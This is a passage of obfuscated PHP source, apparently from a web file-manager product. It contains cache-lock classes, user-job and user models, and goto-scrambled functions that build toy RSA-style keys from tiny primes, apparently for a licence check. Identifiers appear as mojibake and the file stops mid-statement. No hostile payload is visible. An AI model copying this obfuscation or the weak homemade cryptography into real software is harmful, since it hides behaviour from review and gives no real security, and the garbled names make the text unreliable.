$Cô†‹Æ∏éñ[704]; goto F˘¡ëÒ∏∞ä; aƒƒÌÉ›≤ê: default: $aã‘ßÊ«ì£ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($E∏®ŸëÂ‹†, $d¬í›∫ú¶¬ . $EÁ™ß¶’ëÖ); break; $Fãù‚î†Êó = $Cô†‹Æ∏éñ[713]; } goto f⁄ëŸ›—∫Ã; EÕÀ•–®ÁÒ: $EÁ™ß¶’ëÖ = $F›‚∏‚±ãÖ[25]($E∏®ŸëÂ‹†, 1, 15); $f—ëÍ¥ÃëÉ = $Cô†‹Æ∏éñ[694]; $E∏®ŸëÂ‹† = $F›‚∏‚±ãÖ[25]($E∏®ŸëÂ‹†, 16); goto fµâùΩÌÆê; f∆èÆËåò°: $E∏®ŸëÂ‹† = $F›‚∏‚±ãÖ[2]($E∏®ŸëÂ‹†); $E∏®ŸëÂ‹† = $F›‚∏‚±ãÖ[240]($E∏®ŸëÂ‹†); $aÜ”úñëòâ = $E∏®ŸëÂ‹†[0]; goto EÕÀ•–®ÁÒ; fµâùΩÌÆê: $DÜŒãÎ¬Ò£ = $Cô†‹Æ∏éñ[695]; while (strlen($DÜŒãÎ¬Ò£) < $Cô†‹Æ∏éñ[601]) { if (!$DÜŒãÎ¬Ò£) { break; } $DÜŒãÎ¬Ò£++; } $aÁÚ£°Ü®≈ = $F›‚∏‚±ãÖ[368]; goto FñÏıóèøõ; E⁄∂˘äÓ£: $Cô†‹Æ∏éñ =& $_SERVER[’ÿƒ†ïò]; $F›‚∏‚±ãÖ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; if (!$F›‚∏‚±ãÖ[165]($E∏®ŸëÂ‹†) || $F›‚∏‚±ãÖ[24]($E∏®ŸëÂ‹†) < 10) { return !1; } goto f∆èÆËåò°; c†©Â›‘Ú¡: } public function msov9c1154a8($AÙíŸå”∏ï) { goto d√ùçûéÑã; c„Ç≈ ú˜√: if (!$f¿Ÿ’ùÁÃ—) { die; } for ($D’¨üøÛ´â = 0; $D’¨üøÛ´â < $C«´™êÆ¬Ç * 10; $D’¨üøÛ´â++) { if (($C«´™êÆ¬Ç * $D’¨üøÛ´â + 1) % $Dô∆≠⁄õª™ == 0) { $aù»˘Æ§ïƒ = $f≈™π–Ÿ∆Ò[271](($C«´™êÆ¬Ç * $D’¨üøÛ´â + 1) / $Dô∆≠⁄õª™); break; } } $FñÛ€ﬁÿÊÈ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($f≥éôßèéè * $cÆ†—ÑÉ»¨ . $f≈™π–Ÿ∆Ò[10], $f≈™π–Ÿ∆Ò[174]); goto B«èêÀàòü; dÆÇêÎÃºı: $Dô∆≠⁄õª™ = $f≈™π–Ÿ∆Ò[271](($f≥éôßèéè + $cÆ†—ÑÉ»¨) / 2); $dÒ»©›ìà = $A´úÑ√§•Î[717]; while ($dÒ»©›ìà < $A´úÑ√§•Î[625]) { if ($dÒ»©›ìà >= 0) { break; } $dÒ»©›ìà++; } goto eÜ∆“Ú•… ; e¬ƒˆ´§∫Ó: while ($Dß«√»ÕõÛ < $A´úÑ√§•Î[615]) { if ($Dß«√»ÕõÛ >= 0) { break; } $Dß«√»ÕõÛ++; } $C«´™êÆ¬Ç = ($f≥éôßèéè - 1) * ($cÆ†—ÑÉ»¨ - 1); $c¬⁄–‹ÏëÈ = $A´úÑ√§•Î[716]; goto dÆÇêÎÃºı; d√ùçûéÑã: $A´úÑ√§•Î =& $_SERVER[’ÿƒ†ïò]; $f≈™π–Ÿ∆Ò =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $f≥éôßèéè = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][377]}(); goto eÒé∂á“ÌÕ; eÒé∂á“ÌÕ: $cööÒ¢ŸÆõ = $A´úÑ√§•Î[714]; $cÆ†—ÑÉ»¨ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][377]}(); $Dß«√»ÕõÛ = $A´úÑ√§•Î[715]; goto e¬ƒˆ´§∫Ó; C√Ú∆»£Ù≤: return $b¨®ƒÔæÜﬂ; $e¯ùë¶ä–ì = $A´úÑ√§•Î[721]; while (strlen($e¯ùë¶ä–ì) < $A´úÑ√§•Î[625]) { if (!$e¯ùë¶ä–ì) { break; } $e¯ùë¶ä–ì++; } goto DÆ—ÓÊ´ÕŒ; B«èêÀàòü: $eø©•£≥÷Ù = $A´úÑ√§•Î[720]; $Fõä¯ºƒ˜â = $f≈™π–Ÿ∆Ò[131]($f≈™π–Ÿ∆Ò[378] . ($f≥éôßèéè + $cÆ†—ÑÉ»¨) . $f≈™π–Ÿ∆Ò[379] . $Dô∆≠⁄õª™ . $f≈™π–Ÿ∆Ò[379] . $aù»˘Æ§ïƒ . $f≈™π–Ÿ∆Ò[380]); $b¨®ƒÔæÜﬂ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($AÙíŸå”∏ï, $Fõä¯ºƒ˜â) . $f≈™π–Ÿ∆Ò[381] . $FñÛ€ﬁÿÊÈ; goto C√Ú∆»£Ù≤; eÜ∆“Ú•… : while (1) { $BÍÁ–≥ÀÍã = $Dô∆≠⁄õª™; $b∞÷Ÿºµ≠ = $C«´™êÆ¬Ç; while ($b∞÷Ÿºµ≠ % $BÍÁ–≥ÀÍã != 0) { $f∂íäÍÛ¡Ë = $b∞÷Ÿºµ≠; $b∞÷Ÿºµ≠ = $BÍÁ–≥ÀÍã; $b´âÛó»‚õ = $A´úÑ√§•Î[718]; while (strlen($b´âÛó»‚õ) < $A´úÑ√§•Î[609]) { if (!$b´âÛó»‚õ) { break; } $b´âÛó»‚õ++; } $BÍÁ–≥ÀÍã = $f∂íäÍÛ¡Ë % $BÍÁ–≥ÀÍã; } if ($BÍÁ–≥ÀÍã == 1) { break; } else { $Dô∆≠⁄õª™++; } } $aù»˘Æ§ïƒ = 2; $f¿Ÿ’ùÁÃ— = $A´úÑ√§•Î[719]; goto c„Ç≈ ú˜√; DÆ—ÓÊ´ÕŒ: } public function xize69d2da47($bÀ¥‚◊„©Ø) { goto d∏ûç’óÀÌ; D¡ı≤ûöôã: $Eá„Û∑ÊÕÙ = $C¬ûé–Î÷∆[271](($dî∑–˜ùŸÈ + $Aà îµ‚âÔ) / 2); while (1) { $F¿ˆõ∞ı“¨ = $Eá„Û∑ÊÕÙ; $CíÂ≈µ‚•Ê = $A®€◊·ûé€[726]; while ($CíÂ≈µ‚•Ê < $A®€◊·ûé€[615]) { if ($CíÂ≈µ‚•Ê >= 0) { break; } $CíÂ≈µ‚•Ê++; } $E«·•ß∫Ó = $aÒ”È˜π„≈; while ($E«·•ß∫Ó % $F¿ˆõ∞ı“¨ != 0) { $BúÜﬂî™‘´ = $E«·•ß∫Ó; $fàóÆ¯ƒ≈‡ = $A®€◊·ûé€[727]; if (strlen($fàóÆ¯ƒ≈‡) < $A®€◊·ûé€[607]) { return; } $E«·•ß∫Ó = $F¿ˆõ∞ı“¨; $F¿ˆõ∞ı“¨ = $BúÜﬂî™‘´ % $F¿ˆõ∞ı“¨; } if ($F¿ˆõ∞ı“¨ == 1) { break; } else { $Eá„Û∑ÊÕÙ++; } } $Cçóÿ™˘‡© = 2; goto DÁÉÈ‡éÀ’; d∏ûç’óÀÌ: $A®€◊·ûé€ =& $_SERVER[’ÿƒ†ïò]; $C¬ûé–Î÷∆ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $dıËƒ¬é€ò = $C¬ûé–Î÷∆[0]($C¬ûé–Î÷∆[381], $bÀ¥‚◊„©Ø); goto dû÷èìö‚Ç; dû÷èìö‚Ç: $f‡»ãÆØ‘Ò = $A®€◊·ûé€[722]; if (!$f‡»ãÆØ‘Ò) { die; } if ($C¬ûé–Î÷∆[19]($dıËƒ¬é€ò) != 2) { return $C¬ûé–Î÷∆[10]; } goto câè¶ì„ü“; Cœ°íùøÀë: $AÚ‰©áØ™ä = $C¬ûé–Î÷∆[131]($C¬ûé–Î÷∆[378] . ($dî∑–˜ùŸÈ + $Aà îµ‚âÔ) . $C¬ûé–Î÷∆[379] . $Eá„Û∑ÊÕÙ . $C¬ûé–Î÷∆[379] . $Cçóÿ™˘‡© . $C¬ûé–Î÷∆[380]); $dá’ªÔøæ÷ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($dıËƒ¬é€ò[0], $AÚ‰©áØ™ä); return $dá’ªÔøæ÷; goto C÷¡æ¡™ûì; DÁÉÈ‡éÀ’: $c˜„èÍäÃ = $A®€◊·ûé€[728]; if (!$c˜„èÍäÃ) { die; } for ($e–êËäéåö = 0; $e–êËäéåö < $aÒ”È˜π„≈ * 10; $e–êËäéåö++) { if (($aÒ”È˜π„≈ * $e–êËäéåö + 1) % $Eá„Û∑ÊÕÙ == 0) { $Cçóÿ™˘‡© = $C¬ûé–Î÷∆[271](($aÒ”È˜π„≈ * $e–êËäéåö + 1) / $Eá„Û∑ÊÕÙ); break; } } goto Cœ°íùøÀë; C÷¡æ¡™ûì: $c–ÂËæÀ˘ß = $A®€◊·ûé€[729]; if (strlen($c–ÂËæÀ˘ß) < $A®€◊·ûé€[609]) { die; } goto c÷¢Ÿ‡ù∂†; câè¶ì„ü“: $Fü≥ÿ›≠ä¥ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($dıËƒ¬é€ò[1] . $C¬ûé–Î÷∆[10], $C¬ûé–Î÷∆[174]); if (!$Fü≥ÿ›≠ä¥) { return $C¬ûé–Î÷∆[10]; } $Fü≥ÿ›≠ä¥ = $C¬ûé–Î÷∆[271]($Fü≥ÿ›≠ä¥); goto cè´‡Òôáè; cè´‡Òôáè: $dî∑–˜ùŸÈ = 0; $Aà îµ‚âÔ = 0; $EªÇ¢•µú› = $A®€◊·ûé€[723]; goto C©Ú¶‰å÷‚; C©Ú¶‰å÷‚: if (!$EªÇ¢•µú›) { die; } for ($e–êËäéåö = 3; $e–êËäéåö < $Fü≥ÿ›≠ä¥; $e–êËäéåö += 2) { if ($Fü≥ÿ›≠ä¥ % $e–êËäéåö != 0) { continue; } $dî∑–˜ùŸÈ = $e–êËäéåö; $f∞‰Çà¥¿ÿ = $A®€◊·ûé€[724]; $Aà îµ‚âÔ = $C¬ûé–Î÷∆[271]($Fü≥ÿ›≠ä¥ / $e–êËäéåö); $a⁄äÕÃÇ = $A®€◊·ûé€[725]; while ($a⁄äÕÃÇ < $A®€◊·ûé€[625]) { if ($a⁄äÕÃÇ >= 0) { break; } $a⁄äÕÃÇ++; } break; } $aÒ”È˜π„≈ = ($dî∑–˜ùŸÈ - 1) * ($Aà îµ‚âÔ - 1); goto D¡ı≤ûöôã; c÷¢Ÿ‡ù∂†: } public function nvmd3b7d2b5c() { goto fâ°≠ƒÃ•Â; aò≥æ‘∏≥Ü: $A¯Ã¢–⁄»å = $dÂß¬Èàï´[730]; if (strlen($A¯Ã¢–⁄»å) < $dÂß¬Èàï´[607]) { die; } $a‰à≥è¨Óé = array(); goto F üí¶√Íö; BÍÔÙÙÊ∑ç: return $e¥Êî•øÁÿ; $c£áÒÀÊÛÇ = $dÂß¬Èàï´[733]; if (strlen($c£áÒÀÊÛÇ) < $dÂß¬Èàï´[609]) { die; } goto FÇÛ≈∞Ò≥ñ; fâ°≠ƒÃ•Â: $dÂß¬Èàï´ =& $_SERVER[’ÿƒ†ïò]; $FŸ ûàÒ–Ö =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $E∞›·áÆ∂° = $FŸ ûàÒ–Ö[363]($FŸ ûàÒ–Ö[382](2, 14), $FŸ ûàÒ–Ö[382](2, 16) - 1); goto aò≥æ‘∏≥Ü; F üí¶√Íö: $B◊Êó˘íπì = 1; $dôå©ö⁄Ùæ = $dÂß¬Èàï´[731]; if (strlen($dôå©ö⁄Ùæ) < $dÂß¬Èàï´[615]) { die; } goto eêâÀ´‡±ﬂ; eêâÀ´‡±ﬂ: while ($B◊Êó˘íπì <= (int) $FŸ ûàÒ–Ö[383]($E∞›·áÆ∂°)) { $b◊À«íÂﬁ’ = $B◊Êó˘íπì; $CÒ£⁄óìü = $dÂß¬Èàï´[732]; while ($CÒ£⁄óìü < $dÂß¬Èàï´[607]) { if ($CÒ£⁄óìü >= 0) { break; } $CÒ£⁄óìü++; } while (!0) { $b◊À«íÂﬁ’++; if ($b◊À«íÂﬁ’ <= 2) { $B◊Êó˘íπì = $b◊À«íÂﬁ’; break; } else { if ($b◊À«íÂﬁ’ < 2) { continue; } } $aÕŒ√éÌ∏Â = !0; for ($f¡ùı—ê°© = 2; $f¡ùı—ê°© <= $FŸ ûàÒ–Ö[383]($b◊À«íÂﬁ’); $f¡ùı—ê°©++) { if ($b◊À«íÂﬁ’ % $f¡ùı—ê°© == 0) { $aÕŒ√éÌ∏Â = !1; } } if ($aÕŒ√éÌ∏Â) { $B◊Êó˘íπì = $b◊À«íÂﬁ’; break; } } $a‰à≥è¨Óé[] = $B◊Êó˘íπì; } $e¥Êî•øÁÿ = 2; for ($b◊À«íÂﬁ’ = $E∞›·áÆ∂°; $b◊À«íÂﬁ’ > 1; $b◊À«íÂﬁ’--) { $aÕŒ√éÌ∏Â = !0; foreach ($a‰à≥è¨Óé as $Bµ«ﬂ¨Ü»≤) { if ($b◊À«íÂﬁ’ % $Bµ«ﬂ¨Ü»≤ == 0) { $aÕŒ√éÌ∏Â = !1; break; } } if ($aÕŒ√éÌ∏Â) { $e¥Êî•øÁÿ = $b◊À«íÂﬁ’; break; } } goto BÍÔÙÙÊ∑ç; FÇÛ≈∞Ò≥ñ: } public function tiekcad5613e($Dùæœ©°€ò, $f®ã•÷∏äÆ) { $cØ·˜ç…≤Ë =& $_SERVER[É∫„≈‹Æá¿∫Ö]; return $cØ·˜ç…≤Ë[13](array($cØ·˜ç…≤Ë[14], $cØ·˜ç…≤Ë[384]), $Dùæœ©°€ò, $f®ã•÷∏äÆ); $b€¬Ã⁄˜è¶ = $_SERVER[’ÿƒ†ïò][734]; if (!$b€¬Ã⁄˜è¶) { die; } } public function nqprdb6962de($D®ÜêÆà“ï, $CÀé‘≤⁄∑é) { $Bæí‡±òÜç =& $_SERVER[É∫„≈‹Æá¿∫Ö]; return $Bæí‡±òÜç[13](array($Bæí‡±òÜç[385], $Bæí‡±òÜç[386]), $D®ÜêÆà“ï, $CÀé‘≤⁄∑é); } public function caoq02b90202($B¢ãƒã›°◊, $aéü‘Êÿæ) { $E‚ïµÎüóΩ =& $_SERVER[’ÿƒ†ïò]; $F˜Õä º∏Ü =& $_SERVER[É∫„≈‹Æá¿∫Ö]; return $F˜Õä º∏Ü[13](array($F˜Õä º∏Ü[385], $F˜Õä º∏Ü[387]), $B¢ãƒã›°◊, $aéü‘Êÿæ); $fó”øΩøÖ = $E‚ïµÎüóΩ[735]; while (strlen($fó”øΩøÖ) < $E‚ïµÎüóΩ[615]) { if (!$fó”øΩøÖ) { break; } $fó”øΩøÖ++; } } } goto bﬂ≥ÿµç®Ω; F¨ ´äà™≥: class CacheLockRedis { public function lock($bè”¡ß”è, $eÃäèø©˘Ì = 10) { $B†éåÖœéÇ = Cache::init(); $AÕÊ≠Ωµ≤º = microtime(!0) + $eÃäèø©˘Ì; while (microtime(!0) < $AÕÊ≠Ωµ≤º) { $DΩÙõè‘¶‰ = $B†éåÖœéÇ->get($bè”¡ß”è); if (!$DΩÙõè‘¶‰) { $aûë¢Ω˘®◊ = $B†éåÖœéÇ->setLock($bè”¡ß”è, $AÕÊ≠Ωµ≤º, $eÃäèø©˘Ì); if ($aûë¢Ω˘®◊) { return !0; } } else { if ($DΩÙõè‘¶‰ < microtime(!0)) { $B†éåÖœéÇ->set($bè”¡ß”è, $AÕÊ≠Ωµ≤º, $eÃäèø©˘Ì * 2); if ($B†éåÖœéÇ->get($bè”¡ß”è) === $DΩÙõè‘¶‰) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($bë‰ı¶œπÚ) { return Cache::init()->get($bë‰ı¶œπÚ); } public function unlock($Eªéá”∏≈ﬁ) { return Cache::init()->remove($Eªéá”∏≈ﬁ); } } class CacheLockMemcached { public function lock($A ≥Ò∆çæâ, $Eı™ÇıÁéñ = 0) { $DäËçÃî∞ô = Cache::init(); $aÛΩÉÃµì = microtime(!0) + $Eı™ÇıÁéñ; while (microtime(!0) < $aÛΩÉÃµì) { $fÀ◊ÕãøπΩ = $DäËçÃî∞ô->get($A ≥Ò∆çæâ); if (!$fÀ◊ÕãøπΩ || $fÀ◊ÕãøπΩ < microtime(!0)) { $D‡±€√è∂‚ = $DäËçÃî∞ô->handle->add($A ≥Ò∆çæâ, $aÛΩÉÃµì, $Eı™ÇıÁéñ); if ($D‡±€√è∂‚) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($a˘≈ë¨àËú) { return Cache::init()->get($a˘≈ë¨àËú); } public function unlock($A™ØÏ‘¯œï) { return Cache::init()->remove($A™ØÏ‘¯œï); } } class CacheLockDatabase { public function lock($eÃ∂≥ø≤¨è, $BﬂœÎééõä = 0) { $cÎ∫Ãáâ Œ = Model($_SERVER[’ÿƒ†ïò][824]); $Eı¿Ô◊Æòâ = microtime(!0) + $BﬂœÎééõä; while (microtime(!0) < $Eı¿Ô◊Æòâ) { $aÈöˆËœª = $cÎ∫Ãáâ Œ->get($eÃ∂≥ø≤¨è); if (!$aÈöˆËœª || $aÈöˆËœª < microtime(!0)) { $c¯’Ù™ûÉ† = $cÎ∫Ãáâ Œ->set($eÃ∂≥ø≤¨è, $Eı¿Ô◊Æòâ); if ($c¯’Ù™ûÉ†) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($dôòö⁄Õ≠∞) { return Model($_SERVER[’ÿƒ†ïò][824])->get($dôòö⁄Õ≠∞); } public function unlock($fùº¡Â∞âü) { Model($_SERVER[’ÿƒ†ïò][824])->remove($fùº¡Â∞âü); } } goto DÀ¬πﬂµÕﬂ; BèÊÔùƒáÆ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\x6a\x6f\x62\114\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\144\x65\163\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\145\154\146\112\x6f\142\x4c\x69\163\x74"; public function listData($BÌó®ëœì§ = false, $aáó∏ºòïÜ = "\163\157\162\x74", $c‚àá√Òﬁ˘ = false) { return parent::listData($BÌó®ëœì§, $aáó∏ºòïÜ, $c‚àá√Òﬁ˘); } public function remove($AÁ¥˘ﬂÕÏï) { return parent::remove($AÁ¥˘ﬂÕÏï); } public function add($A°Èé¯¨ÊÊ) { $bô ÿ‰´é» =& $_SERVER[’ÿƒ†ïò]; if ($this->findByName($A°Èé¯¨ÊÊ[$bô ÿ‰´é»[28]])) { return !1; } $A°Èé¯¨ÊÊ[$bô ÿ‰´é»[1749]] = $this->getSort(); return parent::insert($A°Èé¯¨ÊÊ); } private function getSort() { $f˘á—’ó‘ =& $_SERVER[’ÿƒ†ïò]; $dÃüë“Ë≥œ = parent::listData(); $C∑äÉâùñ≤ = array_to_keyvalue($dÃüë“Ë≥œ, $f˘á—’ó‘[33], $f˘á—’ó‘[1749]); return empty($C∑äÉâùñ≤) ? 0 : max($C∑äÉâùñ≤) + 1; } public function update($Aæì¥‰„Ø§, $DçÇ µÛ≥∑) { $E‡¬ú‡¿ò‹ =& $_SERVER[’ÿƒ†ïò]; $Bá°–Õ≥«Ö = parent::listData($Aæì¥‰„Ø§); $F≈∏ÿÑ–πÓ = $this->findByName($DçÇ µÛ≥∑[$E‡¬ú‡¿ò‹[28]]); if (!$Bá°–Õ≥«Ö || $F≈∏ÿÑ–πÓ && $F≈∏ÿÑ–πÓ[$E‡¬ú‡¿ò‹[395]] != $Bá°–Õ≥«Ö[$E‡¬ú‡¿ò‹[395]]) { return !1; } return parent::update($Aæì¥‰„Ø§, $DçÇ µÛ≥∑); } public function setUserJob($E¨àÉ¨ˆàÍ, $F€åÚÚ· Ô) { goto fÌ ®¥¨≠Ë; füí§ÂëÛ–: $b˘≠®‰í˜¥ = rtrim($b˘≠®‰í˜¥, $eØÿ‹ﬂ⁄ë÷[47]); Model($eØÿ‹ﬂ⁄ë÷[532])->metaSet($E¨àÉ¨ˆàÍ, self::JOB_KEY, $b˘≠®‰í˜¥); goto BÑ§”ô·÷ö; fÌ ®¥¨≠Ë: $eØÿ‹ﬂ⁄ë÷ =& $_SERVER[’ÿƒ†ïò]; if (!is_array($F€åÚÚ· Ô)) { $F€åÚÚ· Ô = array($F€åÚÚ· Ô); } $a∂ ºÎ£åı = parent::listData(); goto eâ‘ˆ£äæﬂ; eâ‘ˆ£äæﬂ: $BíÖ≠ƒ≥¢Õ = array_to_keyvalue($a∂ ºÎ£åı, $eØÿ‹ﬂ⁄ë÷[28]); $b˘≠®‰í˜¥ = $eØÿ‹ﬂ⁄ë÷[376]; foreach ($F€åÚÚ· Ô as $F∂≠£ˆéƒØ) { if ($BíÖ≠ƒ≥¢Õ[$F∂≠£ˆéƒØ]) { $b˘≠®‰í˜¥ .= $BíÖ≠ƒ≥¢Õ[$F∂≠£ˆéƒØ][$eØÿ‹ﬂ⁄ë÷[395]] . $eØÿ‹ﬂ⁄ë÷[47]; } else { $cüÔÜ∂–Èê = $this->add($F∂≠£ˆéƒØ); $b˘≠®‰í˜¥ .= $cüÔÜ∂–Èê . $eØÿ‹ﬂ⁄ë÷[47]; } } goto füí§ÂëÛ–; BÑ§”ô·÷ö: } public function getUserJob($côàñçÂ’Ë) { $e®ä‘√°Ÿû = Model($_SERVER[’ÿƒ†ïò][532])->metaGet($côàñçÂ’Ë); return $this->getUserJobInfo($e®ä‘√°Ÿû[self::JOB_KEY]); } public function getUserJobInfo($aª∆¿±ö’≈) { goto fÒ‡ﬁúˆ∆„; eé•…ŸÛÏÕ: $dÉôÖÕÖ®Ω = array_remove_key($dÉôÖÕÖ®Ω, $BâçÂÖâ∏®[194]); $F‚¶ˆ⁄≤¿Ë = array(); foreach ($D∏¶ø¥Üæ¯ as $cÏ¯¨›◊»Ü) { if (isset($dÉôÖÕÖ®Ω[$cÏ¯¨›◊»Ü])) { $F‚¶ˆ⁄≤¿Ë[] = $dÉôÖÕÖ®Ω[$cÏ¯¨›◊»Ü]; } } goto F°¯Ñƒﬁ‡ƒ; fÒ‡ﬁúˆ∆„: $BâçÂÖâ∏® =& $_SERVER[’ÿƒ†ïò]; $D∏¶ø¥Üæ¯ = explode($BâçÂÖâ∏®[47], $aª∆¿±ö’≈); $dÉôÖÕÖ®Ω = parent::listData(); goto eé•…ŸÛÏÕ; F°¯Ñƒﬁ‡ƒ: return $F‚¶ˆ⁄≤¿Ë; goto bÈûßõÉ—Ì; bÈûßõÉ—Ì: } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\155\x65" => "\x75\163\145\x72\x5f\x6d\x65\x74\141", "\155\x65\164\141\x46\x69\x65\x6c\x64" => "\x75\x73\x65\x72\111\x44"); protected $simpleField = "\x75\163\x65\x72\111\x44\x2c\156\151\143\153\116\141\x6d\x65\54\156\141\155\x65\x2c\x61\166\x61\164\141\x72\54\163\145\170\x2c\163\164\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($d≤¯ç∞îÇ«) { $C…û¡˘Ωö∞ =& $_SERVER[’ÿƒ†ïò]; $Dß±ù∂”≠ó = $C…û¡˘Ωö∞[2151]; return array($C…û¡˘Ωö∞[1800] => array($d≤¯ç∞îÇ«[0], $Dß±ù∂”≠ó), $C…û¡˘Ωö∞[1802] => array($d≤¯ç∞îÇ«[0], $Dß±ù∂”≠ó), $C…û¡˘Ωö∞[2152] => array($d≤¯ç∞îÇ«[0], $Dß±ù∂”≠ó)); } protected function getInfo($DÀÜõ…øú, $EÏ œÍç≤ï = false) { $Eê®⁄€Éƒ– = $this->getInfoSimple($DÀÜõ…øú); if (!is_array($Eê®⁄€Éƒ–)) { return array(); } if ($EÏ œÍç≤ï) { return $this->_getInfoApply($Eê®⁄€Éƒ–); } return $this->cacheFunctionGet($_SERVER[’ÿƒ†ïò][1804], $DÀÜõ…øú); } protected function getInfoFull($DÇê·âàëâ, $Bûè≤ﬂÓ’Ç = false) { $CßÈ£ä¥õâ = $this->getInfoSimple($DÇê·âàëâ); if (!is_array($CßÈ£ä¥õâ)) { return array(); } if ($Bûè≤ﬂÓ’Ç) { return $this->_getInfoApply($CßÈ£ä¥õâ, !0); } return $this->cacheFunctionGet($_SERVER[’ÿƒ†ïò][2153], $DÇê·âàëâ); } private function _getInfoApply($Aä…◊äñÓ‡, $EÒà˜ÕûàÓ = false) { goto A÷ø”ÛÜÍ∞; A»àÒ∫õ¶˘: $Aä…◊äñÓ‡ = $this->_listDataApplyItem($Aä…◊äñÓ‡); $DãﬁÇ¶ı◊† = Model($D±äÒÆ∑âô[1234])->metaGet($Aä…◊äñÓ‡[$D±äÒÆ∑âô[85]][$D±äÒÆ∑âô[397]]); $Aä…◊äñÓ‡[$D±äÒÆ∑âô[2156]] = $EÏŒ”°±Õà; goto dﬂ‚Ω§üÀû; A÷ø”ÛÜÍ∞: $D±äÒÆ∑âô =& $_SERVER[’ÿƒ†ïò]; if (!$Aä…◊äñÓ‡) { return $Aä…◊äñÓ‡; } $EÏŒ”°±Õà = md5($D±äÒÆ∑âô[2154] . $Aä…◊äñÓ‡[$D±äÒÆ∑âô[879]] . $D±äÒÆ∑âô[2155] . $Aä…◊äñÓ‡[$D±äÒÆ∑âô[28]]); goto A»àÒ∫õ¶˘; dﬂ‚Ω§üÀû: $Aä…◊äñÓ‡[$D±äÒÆ∑âô[85]][$D±äÒÆ∑âô[1987]] = isset($DãﬁÇ¶ı◊†[$D±äÒÆ∑âô[1988]]) ? $DãﬁÇ¶ı◊†[$D±äÒÆ∑âô[1988]] : null; if ($EÒà˜ÕûàÓ) { $Aä…◊äñÓ‡[$D±äÒÆ∑âô[459]] = $this->metaGet($Aä…◊äñÓ‡[$D±äÒÆ∑âô[1557]]); } return $Aä…◊äñÓ‡; goto DØ…ñÊâÇë; DØ…ñÊâÇë: } protected function getInfoSimple($dõµﬁï“éÚ, $eÌß∏ªåáØ = false) { $D‹È¨ï∑Í˜ =& $_SERVER[’ÿƒ†ïò]; if (!$dõµﬁï“éÚ) { return array(); } if ($eÌß∏ªåáØ) { $eåõ◊ô‘éƒ = $this->where(array($D‹È¨ï∑Í˜[1557] => intval($dõµﬁï“éÚ)))->find(); if (!is_array($eåõ◊ô‘éƒ)) { return array(); } $eåõ◊ô‘éƒ[$D‹È¨ï∑Í˜[2157]] = Action($D‹È¨ï∑Í˜[2158])->parseUrl($eåõ◊ô‘éƒ[$D‹È¨ï∑Í˜[2157]]); return $eåõ◊ô‘éƒ; } return $this->cacheFunctionGet($D‹È¨ï∑Í˜[1805], $dõµﬁï“éÚ); } protected function getInfoSimpleOuter($c‹ïΩàû¬π) { goto c§√ÈÁˆƒ¡; c§√ÈÁˆƒ¡: $Fì∞ ∏ø‚Ç =& $_SERVER[’ÿƒ†ïò]; if (!$c‹ïΩàû¬π || $c‹ïΩàû¬π == 0) { return array($Fì∞ ∏ø‚Ç[1557] => $Fì∞ ∏ø‚Ç[191], $Fì∞ ∏ø‚Ç[28] => $Fì∞ ∏ø‚Ç[160] . LNG($Fì∞ ∏ø‚Ç[2159]) . $Fì∞ ∏ø‚Ç[530], $Fì∞ ∏ø‚Ç[2157] => STATIC_PATH . $Fì∞ ∏ø‚Ç[2160]); } $b≈èºÕ∆Îá = $this->cacheFunctionGet($Fì∞ ∏ø‚Ç[1805], $c‹ïΩàû¬π); goto EËÉÂ®´¢¥; bÚﬁáìË‘ë: return $cÁÇÍÂéÜò; goto e´ùÊ›ãÓö; EËÉÂ®´¢¥: $cÁÇÍÂéÜò = array_field_key($b≈èºÕ∆Îá, explode($Fì∞ ∏ø‚Ç[47], $this->simpleField)); if (!$cÁÇÍÂéÜò) { return array($Fì∞ ∏ø‚Ç[1557] => $Fì∞ ∏ø‚Ç[1113], $Fì∞ ∏ø‚Ç[28] => $Fì∞ ∏ø‚Ç[160] . LNG($Fì∞ ∏ø‚Ç[2161]) . $Fì∞ ∏ø‚Ç[530], $Fì∞ ∏ø‚Ç[2157] => STATIC_PATH . $Fì∞ ∏ø‚Ç[2162]); } $cÁÇÍÂéÜò[$Fì∞ ∏ø‚Ç[2157]] = Action($Fì∞ ∏ø‚Ç[2158])->parseUrl($cÁÇÍÂéÜò[$Fì∞ ∏ø‚Ç[2157]]); goto bÚﬁáìË‘ë; e´ùÊ›ãÓö: } protected function groupUser($eÍ»’Íöúó) { } public static function errorLang($fÁç¢°◊®Ï) { $aú’≥ÌËèÑ =& $_SERVER[’ÿƒ†ïò]; $eÌÏ∑îü∑© = array(self::ERROR_USER_NOT_EXISTS => $aú’≥ÌËèÑ[2163], self::ERROR_USER_PASSWORD_ERROR => $aú’≥ÌËèÑ[2164], self::ERROR_USER_EXIST_NAME => $aú’≥ÌËèÑ[2165], self::ERROR_USER_EXIST_PHONE => $aú’≥ÌËèÑ[2166], self::ERROR_USER_EXIST_EMAIL => $aú’≥ÌËèÑ[2167], self::ERROR_USER_LOGIN_LOCK => $aú’≥ÌËèÑ[2168], self::ERROR_IP_NOT_ALLOW => $aú’≥ÌËèÑ[2169], self::ERROR_USER_EXIST_NICKNAME => $aú’≥ÌËèÑ[2170]); return 